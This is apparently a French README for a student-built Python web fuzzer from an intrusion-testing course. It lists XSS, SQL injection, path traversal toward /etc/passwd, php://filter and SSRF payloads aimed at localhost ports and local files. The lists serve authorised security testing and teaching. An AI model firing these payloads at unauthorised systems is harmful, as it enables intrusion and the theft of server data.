# 🔥 Web Fuzzer - Scanner de Vulnérabilités Web

Script Python automatisé pour la détection de vulnérabilités web.

## 📋 Description

**Web Fuzzer** est un outil de fuzzing personnalisé développé en Python pour identifier automatiquement les vulnérabilités web courantes. Il teste plusieurs endpoints avec des payloads malveillants pour détecter les failles XSS, SQLi, LFI et SSRF.

## 🎯 Fonctionnalités

- ✅ **Détection XSS** (Cross-Site Scripting)
- ✅ **Détection SQLi** (Injection SQL)
- ✅ **Détection LFI** (Local File Inclusion)
- ✅ **Détection SSRF** (Server-Side Request Forgery)
- ✅ **Tests automatisés** sur 6 endpoints critiques
- ✅ **Export des résultats** en fichier texte

## 🚀 Installation

### Prérequis

- Python 3.7+
- pip (gestionnaire de paquets Python)

### Installation des dépendances

```bash
pip install requests
```

## 💻 Utilisation

### Lancement du fuzzer

```bash
python fuzzer.py
```

### Résultats

Les résultats sont affichés en temps réel dans le terminal et sauvegardés automatiquement dans `fuzzing_results.txt`.

## 🔧 Configuration

### Modifier la cible

Éditez la variable `TARGET` dans le script :

```python
TARGET = "http://example.com"
```

### Personnaliser les payloads

Vous pouvez ajouter vos propres payloads dans les listes :

```python
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    # Ajoutez vos payloads ici
]
```

### Endpoints testés

Le fuzzer teste automatiquement ces endpoints :

- `/search?search_query=FUZZ`
- `/product/view?id=FUZZ`
- `/category?id=FUZZ`
- `/user/view?id=FUZZ`
- `/documents?file=FUZZ`
- `/redirect?url=FUZZ`

## 📊 Payloads inclus

### XSS (5 payloads)
- `<script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `'\"><script>alert(1)</script>`
- `javascript:alert(1)`

### SQLi (6 payloads)
- `'`
- `' OR '1'='1`
- `' OR 1=1--`
- `admin'#`
- `' UNION SELECT NULL--`
- `1' AND SLEEP(5)--`

### LFI (4 payloads)
- `../../../etc/passwd`
- `....//....//....//etc/passwd`
- `/etc/passwd`
- `php://filter/read=convert.base64-encode/resource=index.php`

### SSRF (5 payloads)
- `http://localhost`
- `http://127.0.0.1`
- `http://localhost:9002`
- `http://localhost:3306`
- `file:///etc/passwd`

## 📈 Exemple de sortie

```
🔥 Fuzzing automatique
==================================================

🎯 Test de: /search?search_query=FUZZ
  - XSS... 3 trouvé(s)
  - SQLi... 2 trouvé(s)
  - LFI... 0 trouvé(s)
  - SSRF... 1 trouvé(s)

==================================================
📊 RÉSULTATS FINAUX: 15 failles trouvées
==================================================
✅ XSS trouvé: http://example.com/search?search_query=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
✅ SQLi possible: http://example.com/search?search_query=%27

💾 Résultats sauvegardés dans fuzzing_results.txt
```

## 🛠️ Technologies utilisées

- **Python 3.11** - Langage de programmation
- **requests** - Bibliothèque HTTP pour Python
- **urllib.parse** - Encodage URL des payloads
- **concurrent.futures** - Exécution parallèle (optionnel)

## ⚠️ Avertissement

**Usage légal uniquement !**

Cet outil est destiné à des fins éducatives et de tests de sécurité autorisés uniquement. N'utilisez ce script que sur des applications pour lesquelles vous avez une autorisation explicite. L'utilisation non autorisée de cet outil peut être illégale.

## 📝 Licence

Ce projet est développé dans un cadre éducatif (ESGI - 5SIJ).

## 👥 Auteurs

- **Célian Desrayaud**
- **Lorenzon Beaujard**

ESGI - 5ème année Sécurité Informatique et Judiciaire

## 🔗 Contexte

Ce fuzzer a été développé dans le cadre d'un projet académique de sécurité applicative pour le cours de Test d'Intrusion.

## 📚 Ressources

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Documentation Python Requests](https://requests.readthedocs.io/)

---

**Note** : Ce script permet d'identifier rapidement des vulnérabilités web courantes, économisant plusieurs heures de tests manuels lors d'audits de sécurité.
